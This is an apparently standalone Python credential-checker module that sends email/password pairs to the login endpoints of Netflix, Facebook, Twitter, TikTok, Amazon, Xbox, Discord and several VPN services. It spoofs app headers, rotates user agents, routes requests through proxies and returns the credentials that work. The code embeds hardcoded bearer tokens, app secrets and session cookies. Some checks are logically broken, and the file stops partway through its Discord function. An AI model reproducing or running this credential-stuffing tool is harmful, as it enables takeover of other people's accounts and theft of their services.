import requests , uuid , secrets , urllib
from user_agent import generate_user_agent
class login:


    def netflix(email: str, password: str) -> str:
        email = str(email)
        domin = email.split('@')[1]
        url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'
        headers = {
            "Host": "ios.prod.http1.netflix.com",
            "Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTg3NDMzQzUyQzZGQjRCNjczRTg1NjIxRUEzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TvuMtezrkns7ZtQcfAcFOutfzGV9LhYM1QKbizWrz0uHkFoHMVbhNYl",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Netflix.argo.abtests": "",
            "X-Netflix.client.appversion": "10.19.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "ar-US;q=1, en-US;q=0.9",
            "Content-Length": "1851",
            "X-Netflix.client.idiom": "phone",
            "User-Agent": str(generate_user_agent()),
            "X-Netflix.client.type": "argo",
            "X-Netflix.nfnsm": "9",
            "Connection": "close"}
        data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22interactiveFeatureAlexaAndKatieCharacterEnabled%22%3A%229.57.0%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22bigRowEnabled%22%3A%22true%22%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3D4-D5BA7B1A025245368D4AA323E987433C52C6FB4B673E85621EA301D444EC78B1&idiom=phone&iosVersion=14.3&isTablet=false&kids=false&maxDeviceWidth=414&method=call&model=saget&modelType=IPHONE9-4&odpAware=true&param=%7B%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22email%22%3A%22{email}%40{domin}%22%2C%22rememberMe%22%3A%22true%22%2C%22password%22%3A%22{password}%22%7D%2C%22verb%22%3A%22POST%22%2C%22mode%22%3A%22login%22%2C%22flow%22%3A%22appleSignUp%22%7D&pathFormat=graph&pixelDensity=3.0&progressive=false&responseFormat=json'
        r = requests.session()
        # proxies = {'http':proxy,'https':
        res = r.post(url, headers=headers, data=data ,proxies=urllib.request.getproxies() ,allow_redirects=False,verify=False).text
        # print(req)
        if '"memberHome"' in res:
            return {'status' :'Success' ,'login' :True}

        elif '"incorrect_password"' in res:
            return {'status' :'error' ,'login' :'incorrect_password'}

        else:
            return {'status' :'error' ,'login' :'error.email_or_password'}


    
    def netflix_pr(email: str, password: str, proxy: str) -> str:
        email = str(email)
        domin = email.split('@')[1]
        url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'
        headers = {
            "Host": "ios.prod.http1.netflix.com",
            "Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTg3NDMzQzUyQzZGQjRCNjczRTg1NjIxRUEzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TvuMtezrkns7ZtQcfAcFOutfzGV9LhYM1QKbizWrz0uHkFoHMVbhNYl",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Netflix.argo.abtests": "",
            "X-Netflix.client.appversion": "10.19.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "ar-US;q=1, en-US;q=0.9",
            "Content-Length": "1851",
            "X-Netflix.client.idiom": "phone",
            "User-Agent": str(generate_user_agent()),
            "X-Netflix.client.type": "argo",
            "X-Netflix.nfnsm": "9",
            "Connection": "close"}
        data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22interactiveFeatureAlexaAndKatieCharacterEnabled%22%3A%229.57.0%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22bigRowEnabled%22%3A%22true%22%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3D4-D5BA7B1A025245368D4AA323E987433C52C6FB4B673E85621EA301D444EC78B1&idiom=phone&iosVersion=14.3&isTablet=false&kids=false&maxDeviceWidth=414&method=call&model=saget&modelType=IPHONE9-4&odpAware=true&param=%7B%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22email%22%3A%22{email}%40{domin}%22%2C%22rememberMe%22%3A%22true%22%2C%22password%22%3A%22{password}%22%7D%2C%22verb%22%3A%22POST%22%2C%22mode%22%3A%22login%22%2C%22flow%22%3A%22appleSignUp%22%7D&pathFormat=graph&pixelDensity=3.0&progressive=false&responseFormat=json'
        r = requests.session()
        proxies = {'http':f'https://{proxy}'}
        res = r.post(url, headers=headers, data=data ,proxies=proxies,allow_redirects=False,verify=False).text
        # print(req)
        if '"memberHome"' in res:
            return {'status' :'Success' ,'login' :True}

        elif '"incorrect_password"' in res:
            return {'status' :'error' ,'login' :'incorrect_password'}

        else:
            return {'status' :'error' ,'login' :'error.email_or_password'}
    
    
    
    def facebook(email: str, password: str) -> str:
        url = "https://b-graph.facebook.com/auth/login"
        headers = {
        "authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
        "user-agent": "Dalvik/2.1.0 (Linux; U; Android 10; BLA-L29 Build/HUAWEIBLA-L29S) [FBAN/MessengerLite;FBAV/305.0.0.7.106;FBPN/com.facebook.mlite;FBLC/ar_PS;FBBV/372376702;FBCR/Ooredoo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/BLA-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2040};]"}
        data = f"email={email}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id={uuid.uuid4()}&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=POST"
        res = requests.post(url, data=data, headers=headers, verify=False, timeout=15).json()
        if list(res)[0] == "session_key":
            message = {
                'status' :'Success',
                'secret' :str(res["secret"]),
                'id' :str(res["uid"]),
                'access_token' :str(res["access_token"])}
        else:
            try:
                message = {
                    'status': 'error',
                    'message': str(res["error"]["error_user_title"])}
                return message
            except:
                return {'status' :'error'}



    def twiter(user: str, password: str) -> str:
        url = 'https://twitter.com/sessions'
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
            'Content-Length': '901',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'twitter.com',
            'Origin': 'https://twitter.com',
            'Referer': 'https://twitter.com/login?lang=ar',
            'TE': 'Trailers',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': str(generate_user_agent()) ,}
        data = {
            'redirect_after_login': '/',
            'remember_me': '1',
            'authenticity_token': '10908ac0975311eb868c135992f7d397',
            'wfa': '1',
            'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
            'session[username_or_email]': str(user),
            'session[password]': str(password)}
        try:
            req = requests.post(url ,headers=headers ,data=data)
            if ("ct0") in req.cookies:
                message = {
                    'status' :'Success',
                    'user_or_email' :str(user),
                    'password' :str(password)}
                return message
            else:
                return {'status' :'error'}

        except requests.exceptions.ConnectionError:
            return False

        except KeyboardInterrupt:
            return False



    def bupg_twiter(username: str, password: str) -> str:
        token_l = 'https://api.twitter.com/1.1/guest/activate.json'

        t = {
            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F' ,}
        token = requests.post(token_l ,headers=t).json()['guest_token']
        url = "https://api.twitter.com/auth/1/xauth_password.json"
        headers = {
            'Cache-Control': 'no-store',
            'X-B3-TraceId': 'bc35545e2885cf69',
            'OS-Security-Patch-Level': '2017-10-05',
            'X-Twitter-Client-Flavor': '',
            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
            'Accept-Encoding': 'gzip, deflate',
            'X-Twitter-Client-AdID': '143f8c1d-0dab-495e-bdba-6b8f3216d92f',
            'Timezone': 'Asia/Shanghai',
            'X-Twitter-Client-Limit-Ad-Tracking': '0',
            'X-Twitter-Client-DeviceID': 'c0575264c704f9c6',
            'X-Twitter-Client': 'TwitterAndroid',
            'X-Twitter-Client-Language': 'ar-EG',
            'X-Twitter-API-Version': '5',
            'att': '1-p8YDwE1eClUMxxzR8MHgZpnUFyhpILYjFUzExuRI',
            'Optimize-Body': 'true',
            'X-Twitter-Active-User': 'yes',
            'X-Twitter-Client-Version': '8.87.0-release.01',
            'X-Guest-Token': str(token),
            'X-Client-UUID': 'f55fe15f-b1f4-4406-9dd7-e0eb18b841ec',
            'Accept': 'application/json',
            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
            'Accept-Language': 'ar-EG',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '140',
            'Host': 'api.twitter.com',
            'Connection': 'close',
            'Cookie': 'personalization_id=v1_PV0kGHiFp5r175R1KzBEzg==; guest_id=v1%3A161752602861069129'
        }
        data = {
            'x_auth_identifier': username,
            'x_auth_password': password,
            'send_error_codes' :'true',
            'x_auth_login_challenge' :'1',
            'x_auth_login_verification' :'1',
            'ui_metrics': ''}
        login = requests.post(url ,headers=headers ,data=data).text
        if 'oauth_token' in login:
            return {'status' :'Success' ,'login' :'true'}
        else:
            return {'status' :'error' ,'login' :'false'}


    def express(email: str ,password: str) -> str:
        url = "https://www.expressvpn.com/sessions"
        headers = {
            'accept' :'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding' :'gzip, deflate, br',
            'accept-language' :'en-GB,en;q=0.9,en-US;q=0.8',
            'cache-control' :'max-age=0',
            'content-length' :'230',
            'content-type' :'application/x-www-form-urlencoded',
            'cookie' :'xvid=EG-to2YQ4i8JNF4aOKfmzKoVEq_zYc4fa4PkC1scPp4%3D; xvsrcdirect=1; xv_ab=%7B%22be4803_202203_braintree_paypal%22%3A%22be4803_202203_control%22%2C%22webco392_202203_billing_info_winner%22%3A%22webco392_202203_billing_info_variant%22%7D; xvgtm=%7B%22location%22%3A%22EG%22%2C%22logged_in%22%3Afalse%2C%22report_aid_to_ga%22%3Afalse%7D; landing_page=https://www.expressvpn.net/order; _gcl_au=1.1.272875252.1650364637; _clck=waj5qh|1|f0r|0; _gid=GA1.2.1325101230.1650364657; SnapABugRef=https%3A%2F%2Fwww.expressvpn.net%2Forder%20; SnapABugHistory=1#; forterToken=8d15223a3a1e44638004714a9704f258_1650364657385__UDF43_13ck; _fbp=fb.1.1650364658200.1265141463; xvsrcwebsite=www.expressvpn.net; locale=; _gat_UA-8164236-1=1; _xv_web_frontend_session=N0FhSkVLc1dCbEQ2clpjOG9DVEhpM3VWWFJDZW5kcWNKWFQvcVlQK1VISnNvZVZ3T2ZiamtReFJzYnNsbHZOOVVEZWhrSVBaeFpLOVJEeUk1cXNNZlNBRVhSTlNJMEl2b3ZqbmhYMkRqWm5ZMHhtZktrUlhKKzViZ0xSN3Y1dWVOYnRLdWh5R1JJbnpmMis0akQzVUNtWEd3ZXpFaldjUjRON24zUlZSa01RcFJ1VXg1TUhSc2RUWU1renFFQTQrU1lyODV1S0FETDVuNFJNY0NNUWkrbmJ4bnE4WVU0Vk9iSDhLSit0VjNuMit1c3R5T1lwRkFLMmwrUDlPaUxTNC0tRC9IT0ZsdUtET3l6RmNYZytCTVpOZz09--6dee6293e618e7d7fdaa2e416be6e309561e5bed; _ga_ZDM0C7DHZZ=GS1.1.1650364636.1.1.1650364680.16; SnapABugUserAlias=%23; SnapABugVisit=3#1650364658; _ga=GA1.1.1704802388.1650364637; _uetsid=bb1bd490bfcc11ecbf747b496145ae3e; _uetvid=bb1c0730bfcc11ecb901417b6b179450; _clsk=asx9jg|1650364682051|3|1|e.clarity.ms/collect',
            'dnt' :'1',
            'origin' :'https://www.expressvpn.net',
            'referer' :'https://www.expressvpn.net/sign-in',
            'sec-ch-ua' :'"Not A;Brand";v="99", "Chromium";v="100", "Microsoft Edge";v="100"',
            'sec-ch-ua-mobile' :'?0',
            'sec-ch-ua-platform' :'"Windows"',
            'sec-fetch-dest' :'document',
            'sec-fetch-mode' :'navigate',
            'sec-fetch-site' :'same-origin',
            'sec-fetch-user' :'?1',
            'upgrade-insecure-requests' :'1',
            'user-agent' :str(generate_user_agent()) ,}
        data = {
            'utf-8' :'✓',
            'authenticity_token' :'SgVUhccIQKFh/FlqFfTTUErtcAq9oG5hJgX5InEE7eg+Ep9reGOkiRIsvDyo+2tTphNLWW6PdGnsp248zVPMkA==',
            'location_fragment' :'',
            'redirect_path' :'',
            'email' :str(email),
            'password' :str(password),
            'commit' :'Sign In' ,}
        req = requests.post(url ,headers=headers ,data=data).text
        if ("Verification Needed") in req:
            return {'status' :'error'}
        else:
            message = {
                'status' :'Success',
                'user_or_email' :str(email),
                'password' :str(password)}
            return message


    def tiktok(email: str, password: str) -> str:
        url = 'https://api2.musical.ly/passport/user/login/?mix_mode=1&username=1&email=&mobile=&account=&password=hg&captcha=&ts=&app_type=normal&app_language=en&manifest_version_code=2018073102&_rticket=1633593458298&iid=7011916372695598854&channel=googleplay&language=en&fp=&device_type=SM-G955F&resolution=1440*2792&openudid=91cac57ba8ef12b6&update_version_code=2018073102&sys_region=AS&os_api=28&is_my_cn=0&timezone_name=Asia/Muscat&dpi=560&carrier_region=OM&ac=wifi&device_id=6785177577851504133&mcc_mnc=42203&timezone_offset=14400&os_version=9&version_code=800&carrier_region_v2=422&app_name=musical_ly&version_name=8.0.0&device_brand=samsung&ssmix=a&build_number=8.0.0&device_platform=android&region=US&aid=&as=&cp=Qm&mas='
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'cookie': f'csrftoken={secrets.token_hex(8)*2}; sessionid={secrets.token_hex(8)*2};',
            'User-Agent': 'Connectionzucom.zhiliaoapp.musically/2018073102 (Linux; U; Android 9; en_AS; SM-G955F; Build/PPR1.180610.011; Cronet/58.0.2991.0)z',
            'Host': 'api2.musical.ly', 'Connection': 'keep-alive'}
        data = {"email": email, "password": password}
        res = requests.post(url, data=data, headers=headers).text
        if ("user_id") in res:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    def amazon(email: str, password: str) -> str:
        url = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
        headers = {'User-agent': str(generate_user_agent())}
        se = requests.session()
        data = {'customerName': 'GDO Tools', 'email': str(email), 'password': str(password),
                'passwordCheck': str(password)}
        res = se.post(url, headers=headers, data=data).text
        if "You indicated you are a new customer, but an account already exists with the e-mail" in res:
            return {'status': 'error'}
        else:
            message = {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
            return message

    def xbox(email: str, password: str) -> str:
        url = f"https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0"
        headers = {
            'User-Agent': str(generate_user_agent()),
            'Pragma': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Upgrade-Insecure-Requests': '1',
            'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1',
            'Cookie': 'wlidperf=FR=L&ST=1573475967016; MSPShared=1; SDIDC=CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$; IgnoreCAW=1; MSCC=1571654982; mkt=en-US; optimizelyEndUserId=oeu1572238927711r0.5850160263416339; uaid=e94a49f177664960a3fca122edaf8a27; MSPRequ=id=292543&lt=1573475927&co=1; OParams=113FQHpqfm3sRtenXK56hoKAENCNHVun4W*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh; MSPOK=$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043', }
        data = {
            f"i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099"}
        req = requests.post(url, headers=headers, data=data)
        if ("https://account.live.com/profile/accrue?mkt=") in req.cookies:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    def ipvanish(email: str, password: str) -> str:
        url = "https://api.ipvanish.com/api/v3/login"
        data = {
            'api_key': '15cb936e6d19cd7db1d6f94b96017541',
            'client': 'Android-3.4.6.7.98607b98607',
            'os': '25',
            'password': {password},
            'username': {email},
            'uuid': str(uuid.uuid4())}
        headers = {
            'User-Agent': 'Android/ipvanish/1.2.',
            'X-Client': 'ipvanish',
            'X-Client-Version': '1.2.',
            'X-Platform': 'Android',
            'X-Platform-Version': '25',
            'Content-Type': 'application/json; charset=utf-8',
            'Host': 'api.ipvanish.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Length': '197', }
        req = requests.post(url, headers=headers, data=data)
        if ("email") in req.cookies:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    
    def nord(email: str, password: str) -> str:
    	try:
    		url = 'https://zwyr157wwiu6eior.com/v1/users/tokens'
    		data = {'username': email, 'password': password}
    		headers = {
				'User-Agent': str(generate_user_agent())}
    		net = requests.post(url, headers=headers, data=data)
    		if '"Invalid username"' or '"invalid password"' or 'Unauthorized' in net.text or net.status_code == 401:
    			return {'status': 'error'}
    		elif 'user_id' in net.text or net.status_code == 201:
    		          return {
                'status': 'Success',
                'email': str(email),
                'password': str(password),}
    	except:
    		return {'status': 'error'}
    
    
    def windscribe(email: str, password: str) -> str:
        url = "https://windscribe.com/login"
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'cache-control': 'max-age=0',
            'content-length': '145',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': '_pk_id.3.2e1e=bc1601c2c6719d2d.1651667765.1.1651667765.1651667765.; _pk_ses.3.2e1e=*; i_can_has_cookie=1',
            'dnt': '1',
            'origin': 'https://windscribe.com',
            'referer': 'https://windscribe.com/login',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': str(generate_user_agent()), }
        data = {
            'login': '1',
            'upgrade': '0',
            'csrf_time': '1651667761',
            'csrf_token': str(secrets.token_hex(8) * 2),
            'username': str(email),
            'password': str(password),
            'code': '', }
        req = requests.post(url, headers=headers, data=data)
        if ("myaccountpage") in req.text:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    def discord(email: str, password: str) -> str:
        url = "https://discord.com/api/v9/auth/login"
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'content-length': '2175',
            'content-type': 'application/json',
            'cookie': '__dcfduid=38e23636a3b411ecbf5736a31ceed201; __sdcfduid=38e23636a3b411ecbf5736a31ceed201488a0ec25b0cec1c78b382264c43cc1d5e15a14fc36fb5d768457e95a1be143f; __cf_bm=0iLa3fYJcyv2JweZtjSCjNZJ6DpPl57cO0LLY58Kp6g-1651660964-0-AXt1IkxX2zaU2OxgR7TtKG53AJmAiMXMhEVHqAEQPqkZJ897iUjllp4mgSm3y5QQTd1T24oDXmcbdXGQAwPgQ64Lwr/f6fIwD3OKqEvNWrGpSbZEhP6i08sSXYrErVOG8g==; locale=en-GB',
            'dnt': '1',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/login?redirect_to=%2Foauth2%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Fdiscord%252Fcallback%26scope%3Didentify%2520email%26state%3D6ZDY0Vq3g4l3VD2Am3ozPyoR%26client_id%3D707309417145565316',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-GB',
            'x-fingerprint': '971361236031799348.iFHY468AFtAguQhJ4i-KfFTsZn8',
